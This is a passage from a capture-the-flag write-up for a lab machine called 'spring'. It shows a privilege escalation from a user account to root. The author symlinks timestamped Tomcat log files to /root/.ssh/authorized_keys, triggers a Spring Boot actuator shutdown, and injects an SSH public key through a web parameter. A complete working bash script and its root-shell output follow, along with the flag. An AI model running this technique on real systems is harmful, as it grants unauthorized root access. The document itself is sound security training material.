lrwxrwxrwx 1 johnsmith johnsmith     30 Jul 12 12:12 1594555978.log -> /tmp/arbitrary_file_write.test                                                                                                       
lrwxrwxrwx 1 johnsmith johnsmith     30 Jul 12 12:12 1594555979.log -> /tmp/arbitrary_file_write.test                                                                                                       
lrwxrwxrwx 1 johnsmith johnsmith     30 Jul 12 12:12 1594555980.log -> /tmp/arbitrary_file_write.test                                                                                                       
lrwxrwxrwx 1 johnsmith johnsmith     30 Jul 12 12:12 1594555981.log -> /tmp/arbitrary_file_write.test
lrwxrwxrwx 1 johnsmith johnsmith     30 Jul 12 12:12 1594555982.log -> /tmp/arbitrary_file_write.test
lrwxrwxrwx 1 johnsmith johnsmith     30 Jul 12 12:12 1594555983.log -> /tmp/arbitrary_file_write.test
lrwxrwxrwx 1 johnsmith johnsmith     30 Jul 12 12:12 1594555984.log -> /tmp/arbitrary_file_write.test
lrwxrwxrwx 1 johnsmith johnsmith     30 Jul 12 12:12 1594555985.log -> /tmp/arbitrary_file_write.test
lrwxrwxrwx 1 johnsmith johnsmith     30 Jul 12 12:12 1594555986.log -> /tmp/arbitrary_file_write.test
lrwxrwxrwx 1 johnsmith johnsmith     30 Jul 12 12:12 1594555987.log -> /tmp/arbitrary_file_write.test
lrwxrwxrwx 1 johnsmith johnsmith     30 Jul 12 12:12 1594555988.log -> /tmp/arbitrary_file_write.test
lrwxrwxrwx 1 johnsmith johnsmith     30 Jul 12 12:12 1594555989.log -> /tmp/arbitrary_file_write.test
lrwxrwxrwx 1 johnsmith johnsmith     30 Jul 12 12:12 1594555990.log -> /tmp/arbitrary_file_write.test
lrwxrwxrwx 1 johnsmith johnsmith     30 Jul 12 12:12 1594555991.log -> /tmp/arbitrary_file_write.test
lrwxrwxrwx 1 johnsmith johnsmith     30 Jul 12 12:12 1594555992.log -> /tmp/arbitrary_file_write.test
lrwxrwxrwx 1 johnsmith johnsmith     30 Jul 12 12:12 1594555993.log -> /tmp/arbitrary_file_write.test
-rw-rw-r-- 1 johnsmith johnsmith    390 Jul 12 12:10 arbitrary_file_write.sh
```

```
ls -la /tmp/arbit*
```

```
-rw-r--r-- 1 root root 5530 Jul 12 12:13 /tmp/arbitrary_file_write.test
```

```
head /tmp/arbit*
```

```
2020-07-12 12:12:49.005  INFO 670 --- [           main] trationDelegate$BeanPostProcessorChecker : Bean 'org.springframework.cloud.autoconfigure.ConfigurationPropertiesRebinderAutoConfiguration' of type [
org.springframework.cloud.autoconfigure.ConfigurationPropertiesRebinderAutoConfiguration$$EnhancerBySpringCGLIB$$7af57240] is not eligible for getting processed by all BeanPostProcessors (for example: not
 eligible for auto-proxying)

  .   ____          _            __ _ _
 /\\ / ___'_ __ _ _(_)_ __  __ _ \ \ \ \
( ( )\___ | '_ | '_| | '_ \/ _` | \ \ \ \
 \\/  ___)| |_)| | | | | || (_| |  ) ) ) )
  '  |____| .__|_| |_|_| |_\__, | / / / /
 =========|_|==============|___/=/_/_/_/
 :: Spring Boot ::        (v2.3.1.RELEASE)

```

Looks like it is working.

### But What To Write?

So we gained arbitrary file write as root but our application is writing a lot of _junk_, first we need a way to write into the our webservers stdout and second we need to find a place that writing to would give us admin access but the _junk_ generated by the web application doesn't matter.

Let's remember what our `Hello World` rest service was look like;

```
    @RestController
    //https://spring.io/guides/gs/rest-service/
    static class HelloWorldController {
        @RequestMapping("/")
        public String hello(@RequestParam(value = "name", defaultValue = "World") String name) {
            System.out.println(name);
            return String.format("Hello, %s!", name);
        }
    }
```

`System.out.println(name);` is writing what ever parameter we send as `name` to the standard output of the web application and we did test it before by sending `?name=Dking`, let's see if we can find that `Dking` string under `tomcatlogs`;

```bash
johnsmith@spring:~/tomcatlogs$ grep -r Dking
1700850088.log:Dking
1700850088.log:Dking
```

And it is here, so we can write anything we like into standard output.

Now the last thing we need to find the answer for is `where`? [authorized\_keys](https://en.wikibooks.org/wiki/OpenSSH/Client\_Configuration\_Files#\~/.ssh/authorized\_keys) is the best candicate because [openssh just skips the lines if it cannot parse the publickey.](https://github.com/openssh/libopenssh/blob/05dfdd5f54d9a1bae5544141a7ee65baa3313ecd/ssh/auth-rsa.c#L220)

### Root Flag

Let's update our script steps;

1. Create an ssh key if it does not exists,
2. Send a request to `/actuator/shutdown`,
3. Create symlinks to `/root/.ssh/authorized_keys` file in `/home/johnsmith/tomcatlogs/<epoch_time>.log`,
4. Application Stops,
5. Systemd kicks in and restarts the service,
6. Send a request to `Hello World` rest service with our public key,
7. Now our public key should be in authorized\_keys of root so we can just ssh as root

write it;

```bash
#!/bin/bash

#generate ssh key if it does not exists
[ -f ./key ] && true || ssh-keygen -b 2048 -t ed25519 -f ./key -q -N ""
#read public key
pubkey=$(cat ./key.pub)

#send a shutdown request to the spring boot server
curl -X POST https://localhost/actuator/shutdown -H 'x-9ad42dea0356cb04: 172.16.0.21' -k

#get date as epoch format
d=$(date '+%s')

#let's assume 30 seconds is enough to restart the service
for i in {1..30}
do
 #create symlinks to /root/.ssh/authorized_keys for 30 seconds
 let time=$(( d + i ))
 ln -s /root/.ssh/authorized_keys "$time.log"
done

#wait for app to restart
sleep 30s

#send publickey as name to the greating server
curl --data-urlencode "name=$pubkey" https://localhost/ -k
sleep 5s

#connect as root
ssh  -o "StrictHostKeyChecking=no" -i ./key root@localhost
```

and run it;

```
bash get_root.sh
```

```
{"message":"Shutting down, bye..."}Hello, ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMoEnVMdfWYW+36UG4GS4/ab/wBHEOCvGpSTTIdnDXPC johnsmith@spring!Warning: Permanently added 'localhost' (ECDSA) to the list of known hosts.
root@spring:~# pwd
/root
root@spring:~# 
root@spring:~# ls -al
total 168
drwx------  6 root root 135168 Jul 12  2020 .
drwxr-xr-x 24 root root   4096 Jul  3  2020 ..
lrwxrwxrwx  1 root root      9 Jul 10  2020 .bash_history -> /dev/null
-rw-r--r--  1 root root   3106 Apr  9  2018 .bashrc
drwx------  2 root root   4096 Jul 10  2020 .cache
drwx------  3 root root   4096 Jul 10  2020 .gnupg
drwxr-xr-x  3 root root   4096 Jul 10  2020 .local
-rw-r--r--  1 root root    148 Aug 17  2015 .profile
-r--------  1 root root     33 Jul 10  2020 root.txt
drwx------  2 root root   4096 Jul 10  2020 .ssh
-rwx------  1 root root    509 Jul 12  2020 start_tomcat.sh
root@spring:~# cat root.txt 
THM{sshd_does_not_mind_the_junk}
root@spring:~# 
```

Done!

